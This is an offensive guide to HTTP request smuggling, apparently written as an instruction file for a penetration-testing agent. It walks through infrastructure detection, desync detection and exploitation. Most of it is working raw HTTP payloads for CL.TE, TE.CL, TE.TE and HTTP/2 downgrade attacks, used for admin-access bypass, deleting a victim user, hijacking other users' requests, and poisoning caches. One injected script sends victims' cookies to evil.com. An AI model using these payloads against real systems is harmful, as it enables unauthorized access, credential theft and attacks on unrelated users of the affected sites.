<http_request_smuggling_guide>
<title>HTTP REQUEST SMUGGLING</title>

<critical>HTTP request smuggling exploits discrepancies between how front-end and back-end servers parse HTTP requests. By crafting ambiguous requests, attackers can bypass security controls, poison web caches, hijack other users' requests, and access unauthorized resources.</critical>

<scope>
- CL.TE (Content-Length vs Transfer-Encoding): front-end uses CL, back-end uses TE
- TE.CL (Transfer-Encoding vs Content-Length): front-end uses TE, back-end uses CL
- TE.TE (Transfer-Encoding obfuscation): both use TE but parse differently
- HTTP/2 downgrading attacks
- Request splitting and response splitting
</scope>

<methodology>
1. Identify infrastructure: detect proxies, load balancers, and CDNs via headers.
2. Test for desync by observing timing differences and response anomalies.
3. Determine vulnerability type (CL.TE, TE.CL, TE.TE) using detection payloads.
4. Confirm with targeted smuggled requests that alter subsequent responses.
5. Exploit via cache poisoning, request hijacking, or access control bypass.
</methodology>

<infrastructure_detection>
<common_headers>
{% raw %}
# Proxy/CDN indicator headers
Via: 1.1 varnish, 1.1 cloudflare
X-Forwarded-For: client_ip
X-Real-IP: client_ip
X-Cache: HIT | MISS
X-Cache-Status: HIT
CF-Ray: 12345abc  # Cloudflare
X-Amz-Cf-Id: xxx  # CloudFront
X-Served-By: cache-lax17835  # Fastly
X-Varnish: 123456789
Server: nginx, Apache, ATS  # Backend hints
{% endraw %}
</common_headers>

<connection_reuse>
{% raw %}
# Test if connections are reused (required for smuggling)
# Send multiple requests on same connection
# Observe if responses maintain order
# HTTP/1.1 Keep-Alive is key

Connection: keep-alive
Keep-Alive: timeout=5, max=1000
{% endraw %}
</connection_reuse>
</infrastructure_detection>

<detection_techniques>
<cl_te_detection>
{% raw %}
# CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
# Detection payload - causes timeout if vulnerable

POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
X

# If vulnerable: back-end waits for more chunks, causes timeout
# Expected: ~5-10 second delay on vulnerable systems
{% endraw %}
</cl_te_detection>

<te_cl_detection>
{% raw %}
# TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
# Detection payload

POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X

# If vulnerable: 'X' becomes start of next request
# Expected: immediate response, next request may error/change
{% endraw %}
</te_cl_detection>

<te_te_detection>
{% raw %}
# TE.TE: Both use Transfer-Encoding but parse differently
# Test with obfuscated Transfer-Encoding headers

Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
 : chunked
Transfer-Encoding: chunKed

# Various obfuscation techniques that one server accepts, other ignores
{% endraw %}
</te_te_detection>

<timing_detection>
{% raw %}
# Timing-based detection
# Send request with incomplete chunked body
# Measure if response is delayed (server waiting for complete body)

POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A

# If Transfer-Encoding is processed: timeout waiting for 0\r\n chunk
# If Content-Length is processed: immediate response (4 bytes received)
{% endraw %}
</timing_detection>
</detection_techniques>

<exploitation_techniques>
<cl_te_exploitation>
{% raw %}
# CL.TE: Smuggle request to back-end
# Front-end sees Content-Length: 13 (forwards full body)
# Back-end sees chunked encoding, processes until 0\r\n

POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

# The "GET /admin" becomes a separate request on the back-end
# Bypasses front-end access controls on /admin
{% endraw %}
</cl_te_exploitation>

<te_cl_exploitation>
{% raw %}
# TE.CL: Smuggle request
# Front-end processes chunked encoding
# Back-end uses Content-Length, leaves extra data in buffer

POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

2e
GET /admin HTTP/1.1
Host: target.com


0


# Back-end only reads 4 bytes, smuggled request waits in buffer
{% endraw %}
</te_cl_exploitation>

<te_te_exploitation>
{% raw %}
# TE.TE: Exploit parsing differences
# Use obfuscation that one server accepts, other ignores

POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: identity

2e
GET /admin HTTP/1.1
Host: target.com


0


{% endraw %}
</te_te_exploitation>
</exploitation_techniques>

<attack_scenarios>
<access_control_bypass>
{% raw %}
# Bypass front-end access restrictions
# Front-end blocks /admin, smuggled request reaches back-end directly

POST / HTTP/1.1
Host: target.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin/delete?user=victim HTTP/1.1
Host: target.com

{% endraw %}
</access_control_bypass>

<request_hijacking>
{% raw %}
# Capture another user's request
# Smuggled request waits with incomplete body
# Next user's request becomes body of smuggled request

POST / HTTP/1.1
Host: target.com
Content-Length: 80
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

data=

# Another user's request becomes value of 'data' parameter
# Including their cookies and headers
{% endraw %}
</request_hijacking>

<cache_poisoning>
{% raw %}
# Poison cache with smuggled response
# Smuggle request that triggers redirect/error on cacheable URL

POST / HTTP/1.1
Host: target.com
Content-Length: 70
Transfer-Encoding: chunked

0

GET /static/app.js HTTP/1.1
Host: evil.com


# Back-end redirects to evil.com (different Host header)
# Response is cached for /static/app.js
# Subsequent users get poisoned response
{% endraw %}
</cache_poisoning>

<open_redirect_exploitation>
{% raw %}
# Use open redirect with smuggling
# Smuggle request to redirect endpoint

POST / HTTP/1.1
Host: target.com
Content-Length: 80
Transfer-Encoding: chunked

0

GET /redirect?url=https://evil.com HTTP/1.1
Host: target.com


# Next user gets redirected to attacker's site
{% endraw %}
</open_redirect_exploitation>

<credential_stealing>
{% raw %}
# Steal credentials via reflected XSS + smuggling
# Smuggle request to endpoint that reflects input

POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

q=<script>fetch('//evil.com?c='+document.cookie)</script>

# Response with XSS is served to next user
{% endraw %}
</credential_stealing>
</attack_scenarios>

<http2_downgrade>
<h2_smuggling>
{% raw %}
# HTTP/2 to HTTP/1.1 downgrade attacks
# Front-end uses HTTP/2, back-end receives HTTP/1.1

# HTTP/2 request with smuggled CL
:method: POST
:path: /
:authority: target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com

# HTTP/2 header injection
:method: GET
:path: / HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /admin
:authority: target.com

# Body injection via HTTP/2
# Send body larger than content-length indicates
{% endraw %}
</h2_smuggling>

<h2c_smuggling>
{% raw %}
# HTTP/2 cleartext upgrade smuggling
# Upgrade: h2c header processing differences

GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings

# If proxy doesn't understand h2c, may forward malicious request
{% endraw %}
</h2c_smuggling>
</http2_downgrade>

<bypass_techniques>
<te_obfuscation>
{% raw %}
# Transfer-Encoding obfuscation techniques
Transfer-Encoding: chunked                    # Standard
Transfer-Encoding : chunked                   # Space before colon
Transfer-Encoding: xchunked                   # Invalid value (may be ignored)
Transfer-Encoding: chunked
Transfer-Encoding: x                          # Duplicate header
Transfer-Encoding:[tab]chunked                # Tab instead of space
Transfer-Encoding:
 chunked                                      # Line folding (obsolete)
X-Ignored: ignored\r\nTransfer-Encoding: chunked  # Header injection
Transfer-Encoding:chunked                     # No space
transfer-encoding: chunked                    # Lowercase
Transfer-Encoding: CHUNKED                    # Uppercase
Transfer-Encoding: chunked, identity          # Multiple values
{% endraw %}
</te_obfuscation>

<chunk_extension>
{% raw %}
# Chunk extensions (after size, before CRLF)
5;ext=value
hello
0

# Some parsers ignore extensions, others may fail
5;malicious=payload\r\nX-Injected: header
hello
0
{% endraw %}
</chunk_extension>
</bypass_techniques>

<validation>
1. Demonstrate desync via timing differences or response anomalies.
2. Confirm vulnerability type (CL.TE, TE.CL, TE.TE) with specific payloads.
3. Show successful smuggling by accessing restricted resources.
4. Prove impact via request hijacking or cache poisoning.
5. Document exact headers and body required for exploitation.
</validation>

<false_positives>
- Single-server configurations (no proxy/CDN)
- Servers with identical HTTP parsing
- HTTP/2 end-to-end (no downgrade)
- Infrastructure that normalizes conflicting headers
- Connection-per-request (no keep-alive)
- Rate limiting or WAF blocking malformed requests
</false_positives>

<impact>
- Web cache poisoning affecting all users
- Session hijacking and credential theft
- Access control bypass to administrative functions
- Request routing manipulation
- Partial credential harvesting from other users
- Exploitation of backend-only vulnerabilities
</impact>

<pro_tips>
1. Test during low-traffic periods to avoid affecting other users.
2. Use unique markers in smuggled requests to identify responses.
3. Test all Transfer-Encoding obfuscation variants systematically.
4. Check HTTP/2 downgrade scenarios when HTTP/2 is supported.
5. Document the exact timing required to exploit timing windows.
6. Consider chained attacks: smuggling + SSRF, smuggling + cache.
7. Test with different HTTP clients; some normalize requests.
8. Look for infrastructure that processes requests differently (CDN vs origin).
9. Use TCP session management to ensure connection reuse.
10. Be cautious in production; smuggling can desync legitimate traffic.
</pro_tips>

<remember>Request smuggling exploits the fundamental ambiguity in HTTP parsing. When two servers disagree on where one request ends and another begins, attackers can inject requests that bypass all front-end controls. The vulnerability exists in the infrastructure, not the application.</remember>
</http_request_smuggling_guide>
